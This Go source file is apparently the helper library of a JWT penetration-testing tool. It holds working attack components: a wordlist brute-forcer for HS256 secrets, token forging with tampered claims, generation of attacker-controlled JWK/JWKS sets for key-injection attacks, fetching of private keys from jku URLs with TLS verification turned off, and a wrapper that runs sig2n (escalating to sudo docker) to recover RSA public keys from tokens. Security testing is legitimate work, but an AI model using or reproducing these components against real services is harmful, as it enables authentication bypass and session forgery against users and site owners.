package main

import (
	"bufio"
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

func GenerateDummyCertPEM() ([]byte, error) {
	priv, err := GenerateRSAKey()
	if err != nil {
		return nil, err
	}
	der, err := GenerateSelfSignedCert(priv)
	if err != nil {
		return nil, err
	}
	block := &pem.Block{Type: "CERTIFICATE", Bytes: der}
	return pem.EncodeToMemory(block), nil
}

func BruteForceHS256(header, payload, signature string, wordlistPath string) (string, error) {
	file, err := os.Open(wordlistPath)
	if err != nil {
		return "", err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	message := header + "." + payload

	for scanner.Scan() {
		secret := scanner.Text()
		mac := hmac.New(sha256.New, []byte(secret))
		mac.Write([]byte(message))
		expectedSig := Base64URLEncode(mac.Sum(nil))

		if expectedSig == signature {
			return secret, nil
		}
	}

	if err := scanner.Err(); err != nil {
		return "", err
	}

	return "", fmt.Errorf("not found")
}

func SendRequest(targetURL string, cookieName string, token string) (int, int64, error) {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return 0, 0, err
	}

	cookie := &http.Cookie{Name: cookieName, Value: token}
	req.AddCookie(cookie)

	tr := &http.Transport{
		TLSNextProto: make(map[string]func(authority string, c *tls.Conn) http.RoundTripper),
	}
	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return 0, 0, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return resp.StatusCode, 0, err
	}

	return resp.StatusCode, int64(len(body)), nil
}

func GenerateRSAKey() (*rsa.PrivateKey, error) {
	return rsa.GenerateKey(rand.Reader, 2048)
}

func GetJWKFromPublic(pub *rsa.PublicKey) map[string]interface{} {
	nBytes := pub.N.Bytes()
	kid := "key-1"
	if len(nBytes) >= 16 {
		kid = fmt.Sprintf("%x-%x-%x-%x-%x", nBytes[0:4], nBytes[4:6], nBytes[6:8], nBytes[8:10], nBytes[10:16])
	}
	return map[string]interface{}{
		"kty": "RSA",
		"e":   Base64URLEncode(big.NewInt(int64(pub.E)).Bytes()),
		"n":   Base64URLEncode(pub.N.Bytes()),
		"kid": kid,
	}
}

func GetJWKSet(pub *rsa.PublicKey) string {
	jwk := GetJWKFromPublic(pub)
	jwks := map[string]interface{}{"keys": []interface{}{jwk}}
	jwksJSON, _ := json.MarshalIndent(jwks, "", "  ")
	return string(jwksJSON)
}

func GetSingleJWK(pub *rsa.PublicKey) string {
	jwk := GetJWKFromPublic(pub)
	jwkJSON, _ := json.MarshalIndent(jwk, "", "  ")
	return string(jwkJSON)
}

func GetJWKMinimal(pub *rsa.PublicKey) string {
	jwk := map[string]interface{}{
		"kty": "RSA",
		"e":   Base64URLEncode(big.NewInt(int64(pub.E)).Bytes()),
		"n":   Base64URLEncode(pub.N.Bytes()),
	}
	jwkJSON, _ := json.MarshalIndent(jwk, "", "  ")
	return string(jwkJSON)
}

func GenerateSelfSignedCert(priv *rsa.PrivateKey) ([]byte, error) {
	serialNumber, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject:      pkix.Name{Organization: []string{"JWT Pentest Inc"}},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(time.Hour * 24 * 365),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return nil, err
	}
	return derBytes, nil
}

func SignRS256(header, payload string, priv *rsa.PrivateKey) (string, error) {
	hEnc := Base64URLEncode([]byte(header))
	pEnc := Base64URLEncode([]byte(payload))
	message := hEnc + "." + pEnc

	hashed := sha256.Sum256([]byte(message))
	signature, err := rsa.SignPKCS1v15(rand.Reader, priv, crypto.SHA256, hashed[:])
	if err != nil {
		return "", err
	}

	return message + "." + Base64URLEncode(signature), nil
}

func DecodeJWT(token string) (string, string, string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", "", "", fmt.Errorf("invalid JWT")
	}
	return parts[0], parts[1], parts[2], nil
}

func Base64URLDecode(s string) (string, error) {
	if l := len(s) % 4; l > 0 {
		s += strings.Repeat("=", 4-l)
	}
	decoded, err := base64.URLEncoding.DecodeString(s)
	if err != nil {
		return "", err
	}
	return string(decoded), nil
}

func Base64URLEncode(s []byte) string {
	return strings.TrimRight(base64.URLEncoding.EncodeToString(s), "=")
}

func JSONModify(jsonStr string, key string, value interface{}) (string, error) {
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(jsonStr), &data); err != nil {
		return "", err
	}
	data[key] = value
	modified, err := json.Marshal(data)
	if err != nil {
		return "", err
	}
	return string(modified), nil
}

func JSONDelete(jsonStr string, key string) (string, error) {
	var data map[string]interface{}
	if err := json.Unmarshal([]byte(jsonStr), &data); err != nil {
		return "", err
	}
	delete(data, key)
	modified, err := json.Marshal(data)
	if err != nil {
		return "", err
	}
	return string(modified), nil
}

func SignHS256(header, payload string, secret []byte) string {
	hEnc := Base64URLEncode([]byte(header))
	pEnc := Base64URLEncode([]byte(payload))
	message := hEnc + "." + pEnc

	mac := hmac.New(sha256.New, secret)
	mac.Write([]byte(message))
	signature := mac.Sum(nil)

	return message + "." + Base64URLEncode(signature)
}

func FetchFileContent(url string) ([]byte, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("fetch failed: %s", resp.Status)
	}

	return io.ReadAll(resp.Body)
}

func FetchPubKeyFromJKU(url string) ([]byte, error) {
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("fetch JWKS failed: %s", resp.Status)
	}

	var jwks struct {
		Keys []map[string]interface{} `json:"keys"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&jwks); err != nil {
		return nil, err
	}

	if len(jwks.Keys) == 0 {
		return nil, fmt.Errorf("no keys in JWKS")
	}

	for _, k := range jwks.Keys {
		if k["kty"] == "RSA" {
			n, _ := base64.RawURLEncoding.DecodeString(k["n"].(string))
			e, _ := base64.RawURLEncoding.DecodeString(k["e"].(string))

			pub := &rsa.PublicKey{
				N: new(big.Int).SetBytes(n),
				E: int(new(big.Int).SetBytes(e).Int64()),
			}

			der, err := x509.MarshalPKIXPublicKey(pub)
			if err != nil {
				return nil, err
			}

			block := &pem.Block{Type: "PUBLIC KEY", Bytes: der}
			return pem.EncodeToMemory(block), nil
		}
	}

	return nil, fmt.Errorf("no RSA key found")
}

func ParseRSAPrivateKey(pemData []byte) (*rsa.PrivateKey, error) {
	block, _ := pem.Decode(pemData)
	if block == nil {
		return nil, fmt.Errorf("invalid PEM block")
	}
	key, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		key2, err2 := x509.ParsePKCS8PrivateKey(block.Bytes)
		if err2 != nil {
			return nil, fmt.Errorf("failed to parse private key: %v", err)
		}
		if rsaKey, ok := key2.(*rsa.PrivateKey); ok {
			return rsaKey, nil
		}
		return nil, fmt.Errorf("parsed key is not RSA")
	}
	return key, nil
}

// FetchPrivateKeyFromJKU tente de récupérer une clé privée RSA depuis une URL JWK/JWKS
func FetchPrivateKeyFromJKU(jkuURL string) (*rsa.PrivateKey, error) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	resp, err := client.Get(jkuURL)
	if err != nil {
		return nil, fmt.Errorf("fetch failed: %v", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read failed: %v", err)
	}

	var jwks struct {
		Keys []map[string]interface{} `json:"keys"`
	}
	if err := json.Unmarshal(body, &jwks); err == nil && len(jwks.Keys) > 0 {
		for _, k := range jwks.Keys {
			if key, err := jwkMapToRSAPrivate(k); err == nil {
				return key, nil
			}
		}
	}

	var single map[string]interface{}
	if err := json.Unmarshal(body, &single); err == nil {
		if key, err := jwkMapToRSAPrivate(single); err == nil {
			return key, nil
		}
	}

	return nil, fmt.Errorf("no private key found in JWK(S)")
}

func jwkMapToRSAPrivate(k map[string]interface{}) (*rsa.PrivateKey, error) {
	if k["kty"] != "RSA" {
		return nil, fmt.Errorf("not RSA")
	}
	dStr, ok := k["d"].(string)
	if !ok || dStr == "" {
		return nil, fmt.Errorf("no private key component")
	}
	decode := func(s string) (*big.Int, error) {
		b, err := base64.RawURLEncoding.DecodeString(s)
		if err != nil {
			return nil, err
		}
		return new(big.Int).SetBytes(b), nil
	}
	nInt, err := decode(k["n"].(string))
	if err != nil {
		return nil, err
	}
	eInt, err := decode(k["e"].(string))
	if err != nil {
		return nil, err
	}
	dInt, err := decode(dStr)
	if err != nil {
		return nil, err
	}

	key := &rsa.PrivateKey{
		PublicKey: rsa.PublicKey{
			N: nInt,
			E: int(eInt.Int64()),
		},
		D: dInt,
	}

	if pStr, ok := k["p"].(string); ok {
		if pInt, err := decode(pStr); err == nil {
			key.Primes = append(key.Primes, pInt)
		}
	}
	if qStr, ok := k["q"].(string); ok {
		if qInt, err := decode(qStr); err == nil {
			key.Primes = append(key.Primes, qInt)
		}
	}

	if len(key.Primes) == 2 {
		key.Precompute()
	}

	if err := key.Validate(); err != nil {
		return nil, fmt.Errorf("invalid key: %v", err)
	}
	return key, nil
}

func GetOrGenerateRSAKey(filename string) (*rsa.PrivateKey, error) {
	if _, err := os.Stat(filename); err == nil {
		data, err := os.ReadFile(filename)
		if err == nil {
			block, _ := pem.Decode(data)
			if block != nil {
				if key, err := x509.ParsePKCS1PrivateKey(block.Bytes); err == nil {
					return key, nil
				}
			}
		}
	}
	key, err := GenerateRSAKey()
	if err != nil {
		return nil, err
	}
	keyBytes := x509.MarshalPKCS1PrivateKey(key)
	pemData := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: keyBytes})
	_ = os.WriteFile(filename, pemData, 0600)
	return key, nil
}

func ExtractPublicKeysWithSig2n(token1, token2 string) ([][]byte, error) {
	var output []byte
	var err error

	cmd := exec.Command("docker", "run", "--rm", "portswigger/sig2n", token1, token2)
	output, err = cmd.CombinedOutput()

	if err != nil && strings.Contains(string(output), "permission denied") {
		cmd = exec.Command("sudo", "docker", "run", "--rm", "portswigger/sig2n", token1, token2)
		output, err = cmd.CombinedOutput()
	}

	if err != nil {
		cmdLocal := exec.Command("sig2n", token1, token2)
		localOutput, localErr := cmdLocal.CombinedOutput()

		if localErr != nil {
			return nil, fmt.Errorf("sig2n failed")
		}
		output = localOutput
	}

	outputStr := string(output)
	var keys [][]byte
	startMarker := "Base64 encoded x509 key: "

	currentIdx := 0
	for {
		startIdx := strings.Index(outputStr[currentIdx:], startMarker)
		if startIdx == -1 {
			break
		}

		startIdx += currentIdx
		startIdx += len(startMarker)

		endIdx := strings.Index(outputStr[startIdx:], "\n")
		if endIdx == -1 {
			endIdx = len(outputStr[startIdx:])
		}

		base64Key := strings.TrimSpace(outputStr[startIdx : startIdx+endIdx])

		pemKey, err := base64.StdEncoding.DecodeString(base64Key)
		if err != nil {
			currentIdx = startIdx + endIdx
			continue
		}

		keys = append(keys, pemKey)
		currentIdx = startIdx + endIdx
	}

	if len(keys) == 0 {
		return nil, fmt.Errorf("no keys found")
	}

	return keys, nil
}

func getPubKeyPEMFromPrivate(privKey *rsa.PrivateKey) ([]byte, error) {
	pubKeyDER, err := x509.MarshalPKIXPublicKey(&privKey.PublicKey)
	if err != nil {
		return nil, err
	}

	pubKeyPEM := pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: pubKeyDER})
	return pubKeyPEM, nil
}
